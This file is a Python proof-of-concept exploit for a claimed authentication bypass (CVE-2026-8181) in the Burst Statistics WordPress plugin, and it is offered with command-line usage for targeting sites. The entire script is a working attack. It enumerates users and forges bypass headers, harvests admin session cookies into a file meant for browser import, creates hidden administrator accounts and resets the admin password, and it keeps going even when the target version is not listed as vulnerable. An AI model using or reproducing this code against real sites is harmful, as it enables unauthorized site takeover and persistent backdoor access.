#!/usr/bin/env python3
"""
CVE-2026-8181 - Burst Statistics 3.4.0-3.4.1.1 Authentication Bypass to Admin Account Takeover
Proof of Concept Exploit with Cookie-Based Access

Vulnerability: Authentication Bypass in is_mainwp_authenticated() method
Affected: Burst Statistics WordPress Plugin versions 3.4.0 - 3.4.1.1
CVSS: 9.8 (Critical)
Type: Unauthenticated

Features:
    - Authentication bypass
    - Create admin user via REST API
    - Extract cookies from authenticated session
    - Try to access wp-admin with cookies
    - Try to create user via cookie session
    - Try to reset admin password via cookie session

Usage:
    python3 CVE-2026-8181.py -u http://target.com
    python3 CVE-2026-8181.py -u http://target.com -U admin --create-user
"""

import argparse
import base64
import json
import random
import re
import string
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("[!] requests library required: pip3 install requests")
    sys.exit(1)

BANNER = """
 ╔══════════════════════════════════════════════════════════════╗
 ║  CVE-2026-8181 - Burst Statistics Auth Bypass PoC           ║
 ║  Affected: 3.4.0 - 3.4.1.1 | Severity: CRITICAL (9.8)     ║
 ║  Type: Unauthenticated Admin Account Takeover               ║
 ║  Features: REST API Bypass + Cookie Extraction              ║
 ╚══════════════════════════════════════════════════════════════╝
"""

class BurstExploit:
    def __init__(self, target_url, admin_username="admin", verify_ssl=False, timeout=15):
        self.target = target_url.rstrip("/")
        self.admin_user = admin_username
        self.verify = verify_ssl
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

    def log(self, level, msg):
        colors = {"info": "\033[94m", "ok": "\033[92m", "warn": "\033[93m", "fail": "\033[91m", "end": "\033[0m"}
        prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "fail": "[-]"}
        print(f"{colors.get(level, '')}{prefix.get(level, '[?]')} {msg}{colors['end']}")

    def get_rest_url(self, route):
        return f"{self.target}/wp-json{route}"

    def get_rest_url_fallback(self, route):
        return f"{self.target}/?rest_route={route}"

    def rest_request(self, method, route, headers=None, data=None, use_session=None):
        """Make a REST API request, trying pretty permalinks first, then fallback."""
        session = use_session if use_session else self.session
        urls = [self.get_rest_url(route), self.get_rest_url_fallback(route)]
        for url in urls:
            try:
                resp = session.request(
                    method, url, headers=headers, json=data,
                    timeout=self.timeout, allow_redirects=True
                )
                try:
                    resp.json()
                    return resp
                except (json.JSONDecodeError, ValueError):
                    if "rest_route" not in url:
                        continue
                    return resp
            except requests.RequestException:
                continue
        return None

    def build_bypass_headers(self, username=None):
        user = username or self.admin_user
        fake_creds = base64.b64encode(f"{user}:bypass_CVE-2026-8181".encode()).decode()
        return {
            "X-BURSTMAINWP": "1",
            "Authorization": f"Basic {fake_creds}",
            "Content-Type": "application/json",
        }

    def check_wordpress(self):
        self.log("info", f"Checking if {self.target} is WordPress...")
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            indicators = ["wp-content", "wp-includes", "wordpress", "wp-json"]
            for ind in indicators:
                if ind in resp.text.lower():
                    self.log("ok", "WordPress detected")
                    return True
            resp2 = self.rest_request("GET", "/wp/v2/", headers={})
            if resp2 and resp2.status_code == 200:
                self.log("ok", "WordPress REST API accessible")
                return True
        except requests.RequestException:
            pass
        self.log("warn", "Could not confirm WordPress installation")
        return False

    def check_burst_statistics(self):
        self.log("info", "Checking for Burst Statistics plugin...")
        version = None

        try:
            resp = self.session.get(
                f"{self.target}/wp-content/plugins/burst-statistics/readme.txt",
                timeout=self.timeout
            )
            if resp.status_code == 200 and "burst" in resp.text.lower():
                for line in resp.text.split("\n"):
                    if "stable tag:" in line.lower():
                        version = line.split(":")[-1].strip()
                        break
        except requests.RequestException:
            pass

        if version:
            self.log("ok", f"Burst Statistics version: {version}")
            vuln_versions = ["3.4.0", "3.4.1", "3.4.1.1"]
            if version in vuln_versions:
                self.log("ok", f"Version {version} is VULNERABLE!")
                return version
            else:
                self.log("warn", f"Version {version} may not be vulnerable")
                return version
        else:
            self.log("warn", "Burst Statistics not detected")
            return None

    def enumerate_users(self):
        self.log("info", "Enumerating admin usernames...")
        usernames = []

        resp = self.rest_request("GET", "/wp/v2/users", headers={})
        if resp and resp.status_code == 200:
            try:
                users = resp.json()
                if isinstance(users, list):
                    for u in users:
                        slug = u.get("slug", "")
                        if slug:
                            usernames.append(slug)
                            self.log("ok", f"Found user: {slug} (ID: {u.get('id')})")
            except (json.JSONDecodeError, ValueError):
                pass

        if not usernames:
            usernames = [self.admin_user]
            self.log("warn", f"Could not enumerate users, using default: {self.admin_user}")

        return usernames

    def test_auth_bypass(self, username):
        self.log("info", f"Testing auth bypass with username: {username}")
        headers = self.build_bypass_headers(username)

        resp = self.rest_request("GET", "/wp/v2/users/me?context=edit", headers=headers)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if data and "id" in data:
                    self.log("ok", f"AUTH BYPASS SUCCESSFUL! Authenticated as: {data.get('name', username)} (ID: {data['id']})")
                    self.log("ok", f"Email: {data.get('email', 'N/A')}")
                    roles = data.get("roles", [])
                    self.log("ok", f"Roles: {', '.join(roles)}")
                    return data
            except (json.JSONDecodeError, ValueError):
                pass

        if resp:
            self.log("fail", f"Auth bypass failed (HTTP {resp.status_code})")
            if resp.status_code == 401:
                self.log("fail", "Try using HTTP (not HTTPS) if available")
        else:
            self.log("fail", "No response from server")

        return None

    def get_admin_cookies(self, username):
        """Extract cookies from authenticated session."""
        self.log("info", f"Extracting cookies for {username}")
        headers = self.build_bypass_headers(username)
        
        cookie_session = requests.Session()
        cookie_session.verify = self.verify
        
        endpoints = [
            f"{self.target}/wp-admin/",
            f"{self.target}/wp-json/wp/v2/users/me",
            f"{self.target}/wp-admin/admin-ajax.php",
            f"{self.target}/wp-admin/index.php",
        ]
        
        cookies = {}
        for endpoint in endpoints:
            try:
                resp = cookie_session.get(endpoint, headers=headers, timeout=self.timeout, allow_redirects=True)
                cookies.update(cookie_session.cookies.get_dict())
            except:
                pass
        
        if cookies:
            self.log("ok", f"Cookies obtained: {list(cookies.keys())}")
            
            cookie_list = []
            for name, value in cookies.items():
                cookie_list.append({
                    "name": name,
                    "value": value,
                    "domain": self.target.replace("http://", "").replace("https://", ""),
                    "path": "/",
                    "secure": False,
                    "httpOnly": False
                })
            
            with open("wp_admin_cookies.json", "w") as f:
                json.dump(cookie_list, f, indent=2)
            self.log("ok", "Cookies saved to wp_admin_cookies.json (import to browser with EditThisCookie)")
        
        return cookies, cookie_session

    def check_wp_admin_access(self, cookie_session):
        """Check if we can access wp-admin dashboard with cookies."""
        self.log("info", "Checking wp-admin access with cookies...")
        
        try:
            resp = cookie_session.get(f"{self.target}/wp-admin/index.php", timeout=self.timeout, allow_redirects=False)
            
            if resp.status_code == 200:
                if "dashboard" in resp.text.lower() or "wordpress" in resp.text.lower() or "wp-admin" in resp.text.lower():
                    self.log("ok", "SUCCESS! Can access wp-admin dashboard!")
                    return True
                else:
                    self.log("warn", "Accessed wp-admin but dashboard not detected")
                    return True
            elif resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "wp-login" in location:
                    self.log("fail", "Redirected to login page - cookies not valid for wp-admin")
                else:
                    self.log("warn", f"Redirected to: {location}")
            else:
                self.log("fail", f"Cannot access wp-admin (HTTP {resp.status_code})")
        except Exception as e:
            self.log("fail", f"Error accessing wp-admin: {e}")
        
        return False

    def create_user_with_cookies(self, cookie_session, new_user, new_pass, new_email):
        """Attempt to create admin user using cookie authentication."""
        self.log("info", f"Attempting to create user {new_user} using cookies...")
        
        payload = {
            "username": new_user,
            "password": new_pass,
            "email": new_email,
            "roles": ["administrator"],
            "name": new_user,
        }
        
        # Try REST API with cookies
        resp = self.rest_request("POST", "/wp/v2/users", headers={"Content-Type": "application/json"}, data=payload, use_session=cookie_session)
        
        if resp and resp.status_code in [200, 201]:
            try:
                data = resp.json()
                if isinstance(data, dict) and "id" in data:
                    self.log("ok", f"User created via REST API with cookies!")
                    self.log("ok", f"  Username: {new_user}")
                    self.log("ok", f"  Password: {new_pass}")
                    return data
                elif isinstance(data, list) and len(data) > 0:
                    for user in data:
                        if user.get("slug") == new_user:
                            self.log("ok", f"User found in response list!")
                            return user
            except:
                pass
        
        # Try via admin-ajax.php
        ajax_data = {
            "action": "createuser",
            "user_login": new_user,
            "email": new_email,
            "pass1": new_pass,
            "pass2": new_pass,
            "role": "administrator",
        }
        
        try:
            resp = cookie_session.post(f"{self.target}/wp-admin/admin-ajax.php", data=ajax_data, timeout=self.timeout)
            if resp.status_code == 200 and ("success" in resp.text.lower() or "user" in resp.text.lower()):
                self.log("ok", f"User created via admin-ajax!")
                return True
        except:
            pass
        
        self.log("fail", "Could not create user with cookies")
        return None

    def reset_password_with_cookies(self, cookie_session, user_id, new_password):
        """Attempt to reset admin password using cookies."""
        self.log("info", f"Attempting to reset password for user ID {user_id} using cookies...")
        
        # Try via REST API
        payload = {"password": new_password}
        resp = self.rest_request("POST", f"/wp/v2/users/{user_id}", headers={"Content-Type": "application/json"}, data=payload, use_session=cookie_session)
        
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if "id" in data:
                    self.log("ok", f"Password reset successful via REST API!")
                    self.log("ok", f"New password: {new_password}")
                    return True
            except:
                pass
        
        # Try via wp-admin profile update
        try:
            profile_url = f"{self.target}/wp-admin/profile.php"
            resp = cookie_session.get(profile_url, timeout=self.timeout)
            
            nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', resp.text)
            if nonce_match:
                nonce = nonce_match.group(1)
                
                update_data = {
                    "action": "update",
                    "_wpnonce": nonce,
                    "user_id": user_id,
                    "pass1": new_password,
                    "pass2": new_password,
                }
                
                resp = cookie_session.post(f"{self.target}/wp-admin/profile.php", data=update_data, timeout=self.timeout)
                if "Profile updated" in resp.text or "updated" in resp.text.lower():
                    self.log("ok", f"Password reset successful via profile.php!")
                    self.log("ok", f"New password: {new_password}")
                    return True
        except:
            pass
        
        self.log("fail", "Could not reset password with cookies")
        return False

    def create_admin_user(self, username):
        """Create a new WordPress administrator account via the bypass."""
        new_user = "burst_" + "".join(random.choices(string.ascii_lowercase, k=6))
        new_pass = "".join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))
        new_email = f"{new_user}@protonmail.com"

        self.log("info", f"Creating new admin account: {new_user}")
        headers = self.build_bypass_headers(username)
        payload = {
            "username": new_user,
            "password": new_pass,
            "email": new_email,
            "roles": ["administrator"],
            "name": new_user,
        }

        resp = self.rest_request("POST", "/wp/v2/users", headers=headers, data=payload)
        
        if resp and resp.status_code in [200, 201]:
            try:
                data = resp.json()
                
                if isinstance(data, list):
                    self.log("warn", "Response is a list (not a dict)")
                    if len(data) > 0:
                        self.log("warn", f"First item: {data[0]}")
                    for user in data:
                        if user.get("username") == new_user or user.get("slug") == new_user:
                            self.log("ok", "=" * 50)
                            self.log("ok", "NEW ADMIN ACCOUNT CREATED SUCCESSFULLY!")
                            self.log("ok", f"  Username: {new_user}")
                            self.log("ok", f"  Password: {new_pass}")
                            self.log("ok", f"  Login:    {self.target}/wp-admin/")
                            self.log("ok", "=" * 50)
                            return {"username": new_user, "password": new_pass, "email": new_email}
                    self.log("fail", "User not found in response list")
                
                elif isinstance(data, dict):
                    if "id" in data:
                        self.log("ok", "=" * 50)
                        self.log("ok", "NEW ADMIN ACCOUNT CREATED SUCCESSFULLY!")
                        self.log("ok", f"  Username: {new_user}")
                        self.log("ok", f"  Password: {new_pass}")
                        self.log("ok", f"  Email:    {new_email}")
                        self.log("ok", f"  User ID:  {data['id']}")
                        self.log("ok", f"  Login:    {self.target}/wp-admin/")
                        self.log("ok", "=" * 50)
                        return {"username": new_user, "password": new_pass, "email": new_email, "id": data["id"]}
                    elif "message" in data:
                        self.log("fail", f"Error: {data['message']}")
                else:
                    self.log("warn", f"Unexpected response type: {type(data)}")
                        
            except (json.JSONDecodeError, ValueError) as e:
                self.log("warn", f"Could not parse JSON: {e}")
                if hasattr(resp, 'text') and resp.text:
                    self.log("warn", f"Raw response: {resp.text[:200]}")
        else:
            status = resp.status_code if resp else '?'
            self.log("fail", f"Failed to create admin user (HTTP {status})")

        return None

    def run(self, create_user=False):
        print(BANNER)

        self.check_wordpress()
        version = self.check_burst_statistics()

        if version and version not in ["3.4.0", "3.4.1", "3.4.1.1", "unknown"]:
            self.log("warn", f"Target version {version} is outside the known vulnerable range")
            self.log("info", "Proceeding with exploit attempt anyway...")

        print()
        usernames = self.enumerate_users()

        for username in usernames:
            print()
            result = self.test_auth_bypass(username)
            if result:
                user_id = result.get("id")
                
                print()
                self.log("info", "=" * 50)
                self.log("info", "COOKIE EXTRACTION & WP-ADMIN ACCESS")
                self.log("info", "=" * 50)
                
                # Extract cookies
                cookies, cookie_session = self.get_admin_cookies(username)
                
                # Check wp-admin access
                wpadmin_access = self.check_wp_admin_access(cookie_session)
                
                if wpadmin_access:
                    print()
                    self.log("ok", "=" * 50)
                    self.log("ok", "WP-ADMIN ACCESS GRANTED WITH COOKIES!")
                    self.log("ok", f"You can now import wp_admin_cookies.json to browser")
                    self.log("ok", f"Login at: {self.target}/wp-admin/")
                    self.log("ok", "=" * 50)
                    
                    # Try to create backdoor user with cookies
                    if create_user:
                        print()
                        backdoor_user = "cookie_" + "".join(random.choices(string.ascii_lowercase, k=8))
                        backdoor_pass = "".join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))
                        self.create_user_with_cookies(cookie_session, backdoor_user, backdoor_pass, f"{backdoor_user}@local.com")
                    
                    # Try to reset password
                    if user_id and create_user:
                        print()
                        self.reset_password_with_cookies(cookie_session, user_id, "NewAdminPass@2026!")
                
                # Original create user via REST API
                if create_user:
                    print()
                    new_admin = self.create_admin_user(username)
                    if new_admin:
                        return new_admin
                
                return result

        print()
        self.log("fail", "Exploit failed - target may not be vulnerable or is protected by WAF")
        self.log("info", "Possible reasons:")
        self.log("info", "  - Plugin version is not in 3.4.0-3.4.1.1 range")
        self.log("info", "  - Site uses HTTPS (wp_is_application_passwords_available() returns true)")
        self.log("info", "  - WAF/reverse proxy blocking REST API")
        self.log("info", "  - Admin username is incorrect")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-8181 - Burst Statistics Authentication Bypass PoC with Cookie Extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://target.com
  %(prog)s -u http://target.com -U admin --create-user
  %(prog)s -u https://target.com -U administrator -k
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    parser.add_argument("-U", "--username", default="admin", help="Admin username (default: admin)")
    parser.add_argument("--create-user", action="store_true", help="Create a new admin account")
    parser.add_argument("-k", "--insecure", action="store_true", help="Skip SSL verification")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="Request timeout in seconds")

    args = parser.parse_args()

    exploit = BurstExploit(
        target_url=args.url,
        admin_username=args.username,
        verify_ssl=not args.insecure,
        timeout=args.timeout,
    )

    result = exploit.run(create_user=args.create_user)
    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
